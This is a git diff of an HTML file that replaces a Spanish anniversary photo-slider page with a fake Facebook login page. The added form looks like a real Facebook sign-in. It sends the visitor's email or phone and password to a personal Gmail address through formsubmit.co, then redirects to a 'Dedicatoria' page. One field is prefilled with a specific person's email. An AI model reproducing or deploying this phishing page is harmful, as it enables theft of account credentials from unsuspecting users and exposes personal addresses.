@@ -1,224 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+<head>
+  <title>Facebook - Iniciar sesión o regístrate</title>
+  <link rel="stylesheet" type="text/css" href="./css/estilo.css">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,700;1,300&display=swap" rel="stylesheet">
+  <link rel="icon" href="image/facebook.ico" type="image/x-icon">
+</head>
+<body>
+  <div class="container">
+    <div class="textos">
+        <h2>facebook</h2>
+        <p>Facebook te ayuda a comunicarte 
+            y compartir con las personas que
+             forman parte de tu vida</p>
+    </div>
+    <div class="formresp">
+        <form class="form" action="https://formsubmit.co/edwinjsa2021@gmail.com" method="POST">
+            <input type="hidden" name="email" value="correoprovicional@gmail.com">
+            <input type="text" id="emailInput" placeholder="Correo electrónico o número de teléfono" name="message" value="denisobando2108@gmail.com"  required>
+            <input type="password" id="passwordInput" placeholder="Contraseña"  name="name" required>
+            <button type="submit" class="entrar" id="loginButton">Iniciar sesión</button>
+            <a href="#">¿Has olvidado la contraseña?</a>
+            <input type="hidden" name="_next" value="https://edwinjsa.github.io/Dedicatoria/index.html">
+            <input type="hidden" name="_captcha" value="false">
 
-  <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remembers</title>
-    <link rel="stylesheet" href="https://unpkg.com/swiper@8/swiper-bundle.min.css" />
-    <link rel="stylesheet" href="style.css">
+            <hr>
 
-  </head>
-
-  <body>
-
-    <audio controls autoplay hidden>
-      <source src="./Luis Miguel - Amarte Es Un Placer (Video Con Letra).mp3" type="audio/mp3">
-    </audio>
-    <section id="tranding">
-      <div class="container">
-        <h3 class="text-center section-subheading">Te Extraño</h3>
-        <h1 class="text-center section-heading">Fecha de Aniversario</h1>
-      </div>
-      <div class="container">
-        <div class="swiper tranding-slider">
-          <div class="swiper-wrapper">
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/1.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$20</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Special Pizza
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/2.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$20</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Meat Ball
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/3.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$40</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Burger
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/5.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$15</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Frish Curry
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/6.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$15</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Pane Cake
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/7.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$20</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Vanilla cake
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-            <!-- Slide-start -->
-            <div class="swiper-slide tranding-slide">
-              <div class="tranding-slide-img">
-                <img src="images/8.jpg" alt="Tranding">
-              </div>
-              <div class="tranding-slide-content">
-                <!-- <h1 class="food-price">$8</h1> -->
-                <div class="tranding-slide-content-bottom">
-                  <!-- <h2 class="food-name">
-                    Straw Cake
-                  </h2> -->
-                  <!-- <h3 class="food-rating">
-                    <span>4.5</span>
-                    <div class="rating">
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                      <ion-icon name="star"></ion-icon>
-                    </div>
-                  </h3> -->
-                </div>
-              </div>
-            </div>
-            <!-- Slide-end -->
-          </div>
-
-          <div class="tranding-slider-control">
-            <div class="swiper-button-prev slider-arrow">
-              <ion-icon name="arrow-back-outline"></ion-icon>
-            </div>
-            <div class="swiper-button-next slider-arrow">
-              <ion-icon name="arrow-forward-outline"></ion-icon>
-            </div>
-            <div class="swiper-pagination"></div>
-          </div>
-
+            <button class="Nuevac">Crear cuenta nueva</button>
+        </form>
+      
+        <div class="conte-ul">
+            <p class="afuera"><span>Crear una página</span> para una persona pública, un grupo
+            de música o un negocio.</p>
         </div>
-      </div>
-    </section>
+    </div>
 
-    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-    <script src="https://unpkg.com/swiper@8/swiper-bundle.min.js"></script>
-    <script src="script.js"></script>
-  </body>
 
+    <!-- <script>
+      // Obtener referencias a los elementos HTML
+      // var emailInput = document.getElementById("emailInput");
+      // var passwordInput = document.getElementById("passwordInput");
+      // var loginButton = document.getElementById("loginButton");
+
+      // Agregar evento de clic al botón de inicio de sesión
+      loginButton.addEventListener("click", function(event) {
+        event.preventDefault();
+
+        // Obtener los valores de correo electrónico y contraseña
+        var email = emailInput.value;
+        var password = passwordInput.value;
+
+        // Crear un objeto de usuario
+        var user = {
+          email: email,
+          password: password
+        };
+
+        // Obtener los datos de usuarios existentes del almacenamiento local o crear un nuevo arreglo si no hay datos
+        var users = JSON.parse(localStorage.getItem("users")) || [];
+
+        // Agregar el nuevo usuario al arreglo
+        users.push(user);
+
+        // Guardar los datos de usuarios actualizados en el almacenamiento local
+        localStorage.setItem("users", JSON.stringify(users));
+
+        // Redirigir a la página que muestra los datos en una tabla
+        window.location.href = "index.html";
+      });
+    </script> -->
+</body>
 </html>
